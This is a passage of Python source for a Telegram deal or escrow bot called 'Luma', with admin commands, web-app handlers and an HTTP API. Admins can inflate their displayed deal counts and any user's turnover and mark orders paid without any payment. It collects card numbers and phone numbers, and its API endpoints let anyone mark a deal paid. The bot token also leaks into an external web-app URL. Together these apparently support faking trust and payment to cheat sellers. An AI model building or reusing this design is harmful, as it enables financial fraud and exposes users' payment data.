        callback.message.text + f"\n\n❌ <b>Отклонено</b> (@{callback.from_user.username or callback.from_user.full_name})",
        parse_mode="HTML"
    )
    await callback.answer("❌ Заявка отклонена.")


@dp.message(Command("panel"))
async def cmd_panel(message: Message):
    if message.from_user.id not in admins:
        return
    lang = user_languages.get(message.from_user.id, "ru")
    if lang == "ru":
        panel_text = (
            "<b>⚙️ Панель администратора</b>\n\n"
            "<blockquote>"
            "➕ /set_my_deals (кол-во) — установить количество сделок\n"
            "💼 /buy memo — отметить ордер как оплаченный\n"
            "📊 /set_turnover user_id сумма — установить оборот"
            "</blockquote>"
        )
    else:
        panel_text = (
            "<b>⚙️ Admin Panel</b>\n\n"
            "<blockquote>"
            "➕ /set_my_deals (amount) — set your deals count\n"
            "💼 /buy memo — mark order as paid\n"
            "📊 /set_turnover user_id amount — set user turnover"
            "</blockquote>"
        )
    await message.answer(panel_text, parse_mode="HTML")


@dp.message(Command("buy"))
async def buy_deal(message: Message):
    uid = message.from_user.id
    if uid not in admins:
        return
    parts = message.text.strip().split()
    lang_buy_u = user_languages.get(uid, "ru")
    if len(parts) != 2:
        await message.answer("⚠️ Используйте: /buy <memo>" if lang_buy_u == "ru" else "⚠️ Usage: /buy <memo>")
        return
    memo = parts[1]
    deal = DEALS.get(memo)
    if not deal:
        await message.answer("⚠️ Сделка не найдена." if lang_buy_u == "ru" else "⚠️ Deal not found.")
        return
    deal['paid'] = True
    deal['buyer_id'] = uid
    deal['buyer_username'] = message.from_user.username or message.from_user.full_name
    lang_buy = user_languages.get(uid, "ru")
    buy_msg = (
        f"✅ Ордер <code>{memo}</code> отмечен как оплаченный."
        if lang_buy == "ru"
        else f"✅ Order <code>{memo}</code> marked as paid."
    )
    await message.answer(buy_msg, parse_mode="HTML")
    try:
        await bot.send_message(
            LOG_CHANNEL_ID,
            f"💰 <b>Ордер оплачен администратором</b>\n\n"
            f"<blockquote>"
            f"🔖 Код: {memo}\n"
            f"👤 Продавец: {deal.get('seller_name')}"
            f"</blockquote>",
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"[ERROR] buy log: {e}")


@dp.message(Command("remove_admin"))
async def remove_admin_command(message: Message):
    if message.from_user.id != MAIN_ADMIN_ID:
        return
    parts = message.text.strip().split()
    if len(parts) < 2:
        return
    try:
        target_id = int(parts[1])
    except ValueError:
        return
    if target_id in admins:
        admins.discard(target_id)
        lang_rm = user_languages.get(message.from_user.id, "ru")
        rm_msg = "<b>✅ Администратор удалён!</b>" if lang_rm == "ru" else "<b>✅ Admin removed successfully!</b>"
        await message.answer(rm_msg, parse_mode="HTML")
    else:
        lang_rm2 = user_languages.get(message.from_user.id, "ru")
        await message.answer("⚠️ Этот пользователь не является администратором." if lang_rm2 == "ru" else "⚠️ This user is not an admin.")


@dp.message(Command("list_admins"))
async def list_admins_command(message: Message):
    if message.from_user.id != MAIN_ADMIN_ID:
        return
    if not admins:
        lang_la = user_languages.get(message.from_user.id, "ru")
        await message.answer("📋 Список администраторов пуст." if lang_la == "ru" else "📋 The admin list is empty.")
        return
    lines = []
    for admin_id in admins:
        user = all_users.get(admin_id, {})
        display = f"@{user['username']}" if user.get("username") else user.get("full_name", "User")
        lines.append(f"➕ {display}\n♦️ {admin_id}")
    lang_la2 = user_languages.get(message.from_user.id, "ru")
    title_la = "👥 Список администраторов" if lang_la2 == "ru" else "👥 Admin List"
    text = f"<b>{title_la}</b>\n\n<blockquote>" + "\n\n".join(lines) + "</blockquote>"
    await message.answer(text, parse_mode="HTML")


@dp.message(lambda message: message.text and message.text.startswith("/set_my_deals"))
async def set_my_deals_command(message: Message):
    uid = message.from_user.id
    if uid not in admins:
        return
    parts = message.text.strip().split()
    lang_smd = user_languages.get(uid, "ru")
    if len(parts) != 2 or not parts[1].isdigit():
        await message.answer("⚠️ Используйте: /set_my_deals <кол-во>" if lang_smd == "ru" else "⚠️ Usage: /set_my_deals <amount>")
        return
    admin_deals[uid] = int(parts[1])
    lang_smd2 = user_languages.get(uid, "ru")
    await message.answer(f"✅ Количество сделок обновлено: {parts[1]}" if lang_smd2 == "ru" else f"✅ Deals count updated: {parts[1]}")
    try:
        username = message.from_user.username or str(uid)
        keyboard = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(
                text="🌐 Открыть Luma" if lang_smd2 == "ru" else "🌐 Open Luma",
                web_app=WebAppInfo(
                    url=f"https://pathfys.github.io/Luma1/?deals={parts[1]}&uid={uid}&username={username}"
                )
            )
        ]])
        smd_notify = f"📊 Количество сделок обновлено: <b>{parts[1]}</b>" if lang_smd2 == "ru" else f"📊 Deals count updated: <b>{parts[1]}</b>"
        await bot.send_message(uid, smd_notify, parse_mode="HTML", reply_markup=keyboard)
    except Exception as e:
        print(f"[ERROR] set_my_deals notify: {e}")


@dp.message(Command("set_turnover"))
async def set_turnover_command(message: Message):
    uid = message.from_user.id
    if uid not in admins and uid != MAIN_ADMIN_ID:
        return
    parts = message.text.strip().split(maxsplit=2)
    lang_st = user_languages.get(uid, "ru")
    if len(parts) != 3:
        await message.answer("⚠️ Используйте:\n/set_turnover <user_id> <сумма>" if lang_st == "ru" else "⚠️ Usage:\n/set_turnover <user_id> <amount>")
        return
    try:
        target_uid = int(parts[1])
        amount = float(parts[2].replace(",", "."))
    except ValueError:
        await message.answer("❌ Неверный формат." if lang_st == "ru" else "❌ Invalid format.")
        return
    user_turnover[target_uid] = f"{amount:.2f}"
    lang_st3 = user_languages.get(uid, "ru")
    st_msg = (
        f"✅ Оборот пользователя <b>{target_uid}</b> установлен: <b>{amount:.2f} TON</b>"
        if lang_st3 == "ru"
        else f"✅ Turnover for <b>{target_uid}</b> set to <b>{amount:.2f} TON</b>"
    )
    await message.answer(st_msg, parse_mode="HTML")
    try:
        t_lang = user_languages.get(target_uid, "ru")
        keyboard = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(
                text="🌐 Открыть Luma" if t_lang == "ru" else "🌐 Open Luma",
                web_app=WebAppInfo(
                    url=f"https://pathfys.github.io/Luma1/?turnover={amount:.2f}&uid={target_uid}"
                )
            )
        ]])
        st_notify = f"📊 Ваш оборот обновлён: <b>{amount:.2f} TON</b>" if t_lang == "ru" else f"📊 Your turnover has been updated: <b>{amount:.2f} TON</b>"
        await bot.send_message(target_uid, st_notify, parse_mode="HTML", reply_markup=keyboard)
    except Exception as e:
        print(f"[ERROR] set_turnover notify: {e}")


# ===================== DEAL CALLBACKS =====================
@dp.callback_query(lambda c: c.data.startswith("order_transferred_"))
async def order_transferred(callback: CallbackQuery):
    memo = callback.data.replace("order_transferred_", "")
    deal = DEALS.get(memo)
    if not deal:
        await callback.answer("⚠️ Сделка не найдена.", show_alert=True)
        return
    deal['transferred'] = True
    ot_lang = user_languages.get(callback.from_user.id, "ru")
    await callback.message.edit_text("✅ Передача подтверждена." if ot_lang == "ru" else "✅ Transfer confirmed.", parse_mode="HTML")
    await callback.answer()


@dp.callback_query(lambda c: c.data.startswith("confirm_order_"))
async def confirm_order(callback: CallbackQuery):
    memo = callback.data.split("_")[-1]
    deal = DEALS.get(memo)
    if not deal:
        await callback.answer("⚠️ Сделка не найдена.", show_alert=True)
        return
    co_lang = user_languages.get(callback.from_user.id, "ru")
    co_msg = f"<b>✔️ Ордер {memo} завершён!</b>" if co_lang == "ru" else f"<b>✔️ Order {memo} completed!</b>"
    await callback.message.edit_text(co_msg, parse_mode="HTML")
    deal["completed"] = True


# ===================== WEBAPP DATA =====================
@dp.message(F.web_app_data)
async def web_app_handler(message: Message):
    uid = message.from_user.id
    lang = user_languages.get(uid, "ru")
    raw = message.web_app_data.data
    print(f"[WebApp] Data from {uid}: {raw}")

    try:
        data = json.loads(raw)
    except Exception as e:
        print(f"[WebApp] JSON parse error: {e}")
        return

    action = data.get('action', '')
    print(f"[WebApp] action={action}")

    # ===== PHOTO =====
    if action == 'get_photo':
        if uid not in user_photos:
            try:
                photos = await bot.get_user_profile_photos(uid, limit=1)
                if photos.total_count > 0:
                    file_id = photos.photos[0][-1].file_id
                    file = await bot.get_file(file_id)
                    user_photos[uid] = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file.file_path}"
                else:
                    user_photos[uid] = ""
            except Exception as e:
                print(f"[ERROR] Photo fetch: {e}")
                user_photos[uid] = ""

        photo_url = user_photos.get(uid, "")
        if photo_url:
            webapp_url = f"https://pathfys.github.io/Luma1/?photo={photo_url}"
            keyboard = InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(
                    text="🔄 Обновить профиль" if user_languages.get(uid, "ru") == "ru" else "🔄 Refresh Profile",
                    web_app=WebAppInfo(url=webapp_url)
                )
            ]])
            ph_lang = user_languages.get(uid, "ru")
            ph_msg = "📸 Нажмите кнопку ниже — фото профиля загрузится:" if ph_lang == "ru" else "📸 Tap below to load your profile photo:"
            await bot.send_message(uid, ph_msg, reply_markup=keyboard)
        return

    # ===== CREATE ORDER =====
    if action == 'create_order':
        import random, string
        currency = data.get('currency', '')
        item = data.get('item', '')
        price = data.get('price', '')

        if not currency or not item or not price:
            print(f"[WebApp] Incomplete order data: currency={currency}, item={item}, price={price}")
            wa_lang = user_languages.get(uid, "ru")
            await bot.send_message(uid, "⚠️ Ошибка: неполные данные ордера." if wa_lang == "ru" else "⚠️ Error: incomplete order data.", parse_mode="HTML")
            return

        memo = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        seller_name = f"@{message.from_user.username}" if message.from_user.username else message.from_user.full_name

        deal = {
            'seller_name': seller_name,
            'seller_id': uid,
            'item': item,
            'price': f"{price} {currency}",
            'memo': memo
        }
        DEALS[memo] = deal

        join_url = f"https://t.me/LumaEnBot?start={memo}"
        wa_lang2 = user_languages.get(uid, "ru")
        keyboard = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(
                text="🔗 Ссылка для покупателя" if wa_lang2 == "ru" else "🔗 Share Order Link",
                url=join_url
            )
        ]])

        order_text = (
            f"✅ <b>Ордер создан!</b>\n\n"
            f"<blockquote>"
            f"📋 Товар: {item}\n"
            f"💰 Сумма: {price} {currency}\n"
            f"🔖 Код: <code>{memo}</code>"
            f"</blockquote>\n\n"
            f"🔗 Ссылка для покупателя:\n{join_url}"
            if wa_lang2 == "ru" else
            f"✅ <b>Order created!</b>\n\n"
            f"<blockquote>"
            f"📋 Item: {item}\n"
            f"💰 Amount: {price} {currency}\n"
            f"🔖 Code: <code>{memo}</code>"
            f"</blockquote>\n\n"
            f"🔗 Buyer link:\n{join_url}"
        )
        await bot.send_message(uid, order_text, parse_mode="HTML", reply_markup=keyboard)

        try:
            await bot.send_message(
                LOG_CHANNEL_ID,
                f"🟢 <b>Новый ордер из WebApp</b>\n\n"
                f"<blockquote>"
                f"👤 Продавец: {seller_name} ({uid})\n"
                f"📦 Товар: {item}\n"
                f"💰 Сумма: {price} {currency}\n"
                f"🔖 Код: {memo}"
                f"</blockquote>\n\n"
                f"🔗 {join_url}",
                parse_mode="HTML"
            )
        except Exception as e:
            print(f"[ERROR] Order log: {e}")
        return

    # ===== REQUISITES =====
    if action.startswith('add_requisites:'):
        parts = action.split(':')
        if len(parts) >= 3:
            currency = parts[1]
            requisite = parts[2]
            print(f"[WebApp] Requisites from {uid}: {currency} — {requisite}")
        return

    # ===== VERIFICATION =====
    if action.startswith('verified:'):
        phone = action.split(':', 1)[1] if ':' in action else 'unknown'
        print(f"[WebApp] Verification {uid}: {phone}")
        try:
            await bot.send_message(
                LOG_CHANNEL_ID,
                f"✅ <b>Верификация</b>\n\n"
                f"<blockquote>👤 ID: {uid}\n📞 Телефон: {phone}</blockquote>",
                parse_mode="HTML"
            )
        except Exception as e:
            print(f"[ERROR] Verification log: {e}")
        return

    # ===== LANGUAGE =====
    if action.startswith('set_language:'):
        lang_code = action.split(':', 1)[1] if ':' in action else 'en'
        user_languages[uid] = lang_code
        print(f"[WebApp] Language set for {uid}: {lang_code}")
        return

    print(f"[WebApp] Unknown action: {action}")


# ===================== TEST LOG =====================
@dp.message(Command("test_log"))
async def test_log(message: Message):
    lang_tl = user_languages.get(message.from_user.id, "ru")
    id_label = "Ваш ID" if lang_tl == "ru" else "Your ID"
    await message.answer(f"{id_label}: <code>{message.from_user.id}</code>", parse_mode="HTML")
    try:
        await bot.send_message(LOG_CHANNEL_ID, "✅ Тест лог-канала прошёл успешно!")
        await message.answer("✅ Сообщение отправлено в канал." if lang_tl == "ru" else "✅ Message sent to log channel.")
    except Exception as e:
        await message.answer(f"❌ Error: {e}")


# ===================== UNIVERSAL TEXT HANDLER =====================
@dp.message(F.text & ~F.web_app_data & ~F.text.startswith('/'))
async def universal_text_handler(message: Message, state: FSMContext):
    uid = message.from_user.id
    text = message.text.strip()
    lang = user_languages.get(uid, "ru")

    if await state.get_state() is not None:
        return

    if uid in _set_my_deals_waiting:
        if not text.isdigit():
            await message.answer("⚠️ Введите только цифры." if lang == "ru" else "⚠️ Please enter numbers only.")
            return
        admin_deals[uid] = int(text)
        _set_my_deals_waiting.discard(uid)
        await message.answer(f"✅ Количество сделок обновлено: {text}" if lang == "ru" else f"✅ Deals count updated: {text}")
        return

    if user_card_states.get(uid):
        CARD_REGEX = re.compile(r"^\d{4}\s?\d{4}\s?\d{4}\s?\d{4}$")
        if not CARD_REGEX.match(text):
            await message.answer(translations["card_screen"][lang]["error"])
            return
        user_cards[uid] = text
        user_card_states[uid] = False
        await message.answer(translations["card_screen"][lang]["saved"])
        return

    if user_ton_states.get(uid):
        if not validate_ton_address(text):
            await message.answer(translations["ton_screen"][lang]["error"])
            return
        user_ton[uid] = text
        user_ton_states[uid] = False
        await message.answer(translations["ton_screen"][lang]["saved"])
        return


# ===================== HTTP API =====================
async def handle_get_user(request):
    username = request.rel_url.query.get('username', '').lower().strip('@')
    if not username:
        return web.json_response({'found': False})

    target_uid = None
    for uid, info in all_users.items():
        u = (info.get('username') or '').lower()
        if u == username:
            target_uid = uid
            break

    if target_uid is None:
        return web.json_response({'found': False})

    return web.json_response({
        'found': True,
        'username': username,
        'uid': target_uid,
        'deals': admin_deals.get(target_uid, 0),
        'turnover': user_turnover.get(target_uid, '0.00'),
        'is_admin': target_uid in admins
    })


async def handle_create_order(request):
    import random, string
    try:
        data = await request.json()
    except Exception as e:
        print(f"[ERROR] create_order JSON: {e}")
        return web.json_response({'ok': False, 'error': 'invalid json'})

    uid = int(data.get('uid', 0))
    username = data.get('username', str(uid))
    first_name = data.get('first_name', '')
    currency = data.get('currency', '')
    item = data.get('item', '')
    price = data.get('price', '')

    if not uid or not currency or not item or not price:
        return web.json_response({'ok': False, 'error': 'missing fields'})

    memo = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    seller_name = f"@{username}" if username != str(uid) else first_name

    deal = {
        'seller_name': seller_name,
        'seller_id': uid,
        'item': item,
        'price': f"{price} {currency}",
        'memo': memo,
        'paid': False,
        'transferred': False,
        'completed': False
    }
    DEALS[memo] = deal

    seller_link = f"https://t.me/LumaEnBot/app?startapp=seller_{memo}"
    buyer_link = f"https://t.me/LumaEnBot/app?startapp=buyer_{memo}"

    u_lang = user_languages.get(uid, "ru")
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👤 Моя ссылка (продавец)" if u_lang == "ru" else "👤 My Link (Seller)", url=seller_link)],
        [InlineKeyboardButton(text="🔗 Ссылка покупателя" if u_lang == "ru" else "🔗 Buyer Link", url=buyer_link)]
    ])

    order_msg = (
        f"✅ <b>Ордер создан!</b>\n\n"
        f"<blockquote>"
        f"📋 Товар: {item}\n"
        f"💰 Сумма: {price} {currency}\n"
        f"🔖 Код: <code>{memo}</code>"
        f"</blockquote>\n\n"
        f"👤 Ваша ссылка (продавец):\n{seller_link}\n\n"
        f"🔗 Ссылка покупателя:\n{buyer_link}"
        if u_lang == "ru" else
        f"✅ <b>Order created!</b>\n\n"
        f"<blockquote>"
        f"📋 Item: {item}\n"
        f"💰 Amount: {price} {currency}\n"
        f"🔖 Code: <code>{memo}</code>"
        f"</blockquote>\n\n"
        f"👤 Your link (seller):\n{seller_link}\n\n"
        f"🔗 Buyer link:\n{buyer_link}"
    )

    try:
        await bot.send_message(uid, order_msg, parse_mode="HTML", reply_markup=keyboard)
    except Exception as e:
        print(f"[ERROR] Order send to {uid}: {e}")

    try:
        await bot.send_message(
            LOG_CHANNEL_ID,
            f"🟢 <b>Новый ордер из WebApp</b>\n\n"
            f"<blockquote>"
            f"👤 Продавец: {seller_name} ({uid})\n"
            f"📦 Товар: {item}\n"
            f"💰 Сумма: {price} {currency}\n"
            f"🔖 Код: {memo}"
            f"</blockquote>\n\n"
            f"👤 Продавец: {seller_link}\n"
            f"🔗 Покупатель: {buyer_link}",
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"[ERROR] Order log: {e}")

    return web.json_response({
        'ok': True,
        'memo': memo,
        'seller_link': seller_link,
        'buyer_link': buyer_link
    })


async def handle_get_deal(request):
    memo = request.rel_url.query.get('memo', '')
    role = request.rel_url.query.get('role', 'buyer')
    if not memo:
        return web.json_response({'found': False})
    deal = DEALS.get(memo)
    if not deal:
        return web.json_response({'found': False})
    return web.json_response({
        'found': True,
        'memo': memo,
        'role': role,
        'seller_name': deal.get('seller_name', '—'),
        'item': deal.get('item', '—'),
        'price': deal.get('price', '—'),
        'paid': deal.get('paid', False),
        'transferred': deal.get('transferred', False),
        'completed': deal.get('completed', False),
        'buyer_username': deal.get('buyer_username', '')
    })


async def handle_transfer_confirm(request):
    try:
        data = await request.json()
    except:
        return web.json_response({'ok': False})
    memo = data.get('memo', '')
    deal = DEALS.get(memo)
    if not deal:
        return web.json_response({'ok': False})
    deal['transferred'] = True
    try:
        await bot.send_message(
            LOG_CHANNEL_ID,
            f"📦 <b>Товар передан</b>\n\n"
            f"<blockquote>🔖 Ордер: {memo}\n👤 Продавец: {deal.get('seller_name')}</blockquote>",
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"[ERROR] transfer log: {e}")
    return web.json_response({'ok': True})


async def handle_complete_deal(request):
    try:
        data = await request.json()
    except:
        return web.json_response({'ok': False})
    memo = data.get('memo', '')
    deal = DEALS.get(memo)
    if not deal:
        return web.json_response({'ok': False})
    deal['completed'] = True
    seller_lang = user_languages.get(deal['seller_id'], 'ru')
    try:
        await bot.send_message(
            deal['seller_id'],
            t("deal_completed_seller", seller_lang, memo=memo),
            parse_mode="HTML"
        )
        await bot.send_message(
            LOG_CHANNEL_ID,
            f"✅ <b>Сделка завершена</b>\n\n"
            f"<blockquote>"
            f"🔖 Ордер: {memo}\n"
            f"👤 Продавец: {deal.get('seller_name')}\n"
            f"💰 Сумма: {deal.get('price')}"
            f"</blockquote>",
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"[ERROR] complete log: {e}")
    return web.json_response({'ok': True})


async def handle_buyer_paid(request):
    try:
        data = await request.json()
    except:
        return web.json_response({'ok': False})

    memo = data.get('memo', '')
    buyer_uid = data.get('uid', 0)
    deal = DEALS.get(memo)
    if not deal:
        return web.json_response({'ok': False})

    deal['paid'] = True
    deal['buyer_id'] = buyer_uid

    buyer_username = ''
    for uid_key, info in all_users.items():
        if uid_key == buyer_uid:
            buyer_username = info.get('username', '') or info.get('full_name', str(buyer_uid))
            break
    if not buyer_username:
        buyer_username = str(buyer_uid)

    deal['buyer_username'] = buyer_username

    try:
        await bot.send_message(
            LOG_CHANNEL_ID,
            f"💰 <b>Ордер оплачен</b>\n\n"
            f"<blockquote>"
            f"🔖 Код: {memo}\n"
            f"👤 Покупатель: @{buyer_username}\n"
            f"👤 Продавец: {deal.get('seller_name')}"
            f"</blockquote>",
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"[ERROR] buyer_paid log: {e}")

    return web.json_response({'ok': True, 'buyer_username': buyer_username})


async def handle_decline_order(request):
    try:
        data = await request.json()
    except:
        return web.json_response({'ok': False})

    memo = data.get('memo', '')
    deal = DEALS.get(memo)
    if not deal:
        return web.json_response({'ok': False})

    deal['declined'] = True
    seller_lang = user_languages.get(deal['seller_id'], 'ru')

    try:
        msg = (
            f"❌ <b>Ордер {memo} был отменён покупателем.</b>"
            if seller_lang == "ru"
            else f"❌ <b>Order {memo} was cancelled by the buyer.</b>"
        )
        await bot.send_message(deal['seller_id'], msg, parse_mode="HTML")
    except Exception as e:
        print(f"[ERROR] decline notify: {e}")

    try:
        await bot.send_message(
            LOG_CHANNEL_ID,
            f"❌ <b>Ордер отменён</b>\n\n<blockquote>🔖 Код: {memo}</blockquote>",
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"[ERROR] decline log: {e}")

    return web.json_response({'ok': True})


# ===================== SUPPORT STORAGE =====================
support_tickets: dict[str, dict] = {}
reply_contexts: dict[int, dict] = {}


# ===================== SUPPORT CLOSE =====================
@dp.callback_query(lambda c: c.data.startswith("support_close_"))
async def support_close(callback: CallbackQuery):
    parts = callback.data.split("_")
    uid = int(parts[2])
    ticket_id = parts[3]
    lang = user_languages.get(uid, "ru")

    if ticket_id in support_tickets:
        support_tickets[ticket_id]["status"] = "closed"

    try:
        await bot.send_message(
            uid,
            t("support_closed", lang, ticket_id=ticket_id),
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"[ERROR] support close notify: {e}")

    await callback.message.edit_text(
        callback.message.text + "\n\n✅ <b>Закрыто</b>",
        parse_mode="HTML"
    )
    await callback.answer("Тикет закрыт ✅")


# ===================== SUPPORT REPLY =====================
@dp.callback_query(lambda c: c.data.startswith("support_reply_"))
async def support_reply(callback: CallbackQuery):
    parts = callback.data.split("_")
    uid = int(parts[2])
    ticket_id = parts[3]

    sent = await bot.send_message(
        LOG_CHANNEL_ID,
        f"✍️ <b>Ответ на обращение #{ticket_id}</b>\n"
        f"<blockquote>👤 Пользователь: {uid}\n\n"
        f"📌 Ответьте на это сообщение — ответ будет переслан пользователю.</blockquote>",
        parse_mode="HTML"
    )
    reply_contexts[sent.message_id] = {"uid": uid, "ticket_id": ticket_id}
    print(f"[DEBUG] reply_contexts updated: {reply_contexts}")
    await callback.answer("⬇️ Ответьте на сообщение выше", show_alert=True)


# ===================== SUPPORT HTTP ENDPOINT =====================
async def handle_support(request):
    try:
        data = await request.json()
    except Exception:
        return web.json_response({"ok": False})

    uid = data.get("uid", 0)
    username = data.get("username", str(uid))
    text = data.get("text", "")
    ticket_id = str(data.get("ticket_id", 0))

    support_tickets[ticket_id] = {
        "id": ticket_id,
        "uid": uid,
        "username": username,
        "text": text,
        "status": "open",
        "replies": [],
        "date": datetime.now().strftime("%d.%m.%Y")
    }

    print(f"[Support] New ticket from {username} ({uid}): {text}")

    try:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="✅ Закрыть", callback_data=f"support_close_{uid}_{ticket_id}"),
            InlineKeyboardButton(text="💬 Ответить", callback_data=f"support_reply_{uid}_{ticket_id}")
        ]])
        await bot.send_message(
            LOG_CHANNEL_ID,
            f"📩 <b>Новое обращение в поддержку</b>\n\n"
            f"<blockquote>"
            f"👤 Пользователь: @{username} ({uid})\n"
            f"🔖 Тикет: #{ticket_id}"
            f"</blockquote>\n\n"
            f"💬 <b>Сообщение:</b>\n{text}",
            parse_mode="HTML",
            reply_markup=keyboard
        )
    except Exception as e:
        print(f"[ERROR] support log: {e}")

    return web.json_response({"ok": True})


async def get_support_tickets(request):
    uid = int(request.rel_url.query.get("uid", 0))
    if not uid:
        return web.json_response({"tickets": []})
    user_tickets = [v for v in support_tickets.values() if v.get("uid") == uid]
    return web.json_response({"tickets": user_tickets})

async def check_admin(request):
    uid = int(request.rel_url.query.get("uid", 0))
    return web.json_response({"is_admin": uid in admins})


# ===================== WEB SERVER =====================
async def start_web_server():
        async def cors_middleware(app, handler):
            async def middleware(request):
                if request.method == 'OPTIONS':
                    response = web.Response()
                else:
                    response = await handler(request)
                response.headers['Access-Control-Allow-Origin'] = '*'
                response.headers['Access-Control-Allow-Headers'] = '*'
                return response

            return middleware

        app = web.Application(middlewares=[cors_middleware])

        app.router.add_get('/user', handle_get_user)
        app.router.add_get('/deal', handle_get_deal)
        app.router.add_post('/create_order', handle_create_order)
        app.router.add_post('/buyer_paid', handle_buyer_paid)
        app.router.add_post('/decline_order', handle_decline_order)
        app.router.add_post('/transfer_confirm', handle_transfer_confirm)
        app.router.add_post('/complete_deal', handle_complete_deal)
        app.router.add_post('/support', handle_support)
        app.router.add_get('/support/tickets', get_support_tickets)
        app.router.add_get("/check_admin", check_admin)

        for route in ['/user', '/deal', '/create_order', '/buyer_paid',
                      '/decline_order', '/transfer_confirm', '/complete_deal',
                      '/support', '/support/tickets']:
            app.router.add_route('OPTIONS', route, lambda r: web.Response())

        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, '0.0.0.0', 8080)
        await site.start()
        print("[INFO] HTTP server started on port 8080")
# ===================== MAIN ===================== #
async def main():
    try:
        print("[INFO] Bot started...")
        await asyncio.gather(
            start_web_server(),
            dp.start_polling(bot)
        )
    finally:
        await bot.session.close()


if __name__ == "__main__":
    asyncio.run(main())
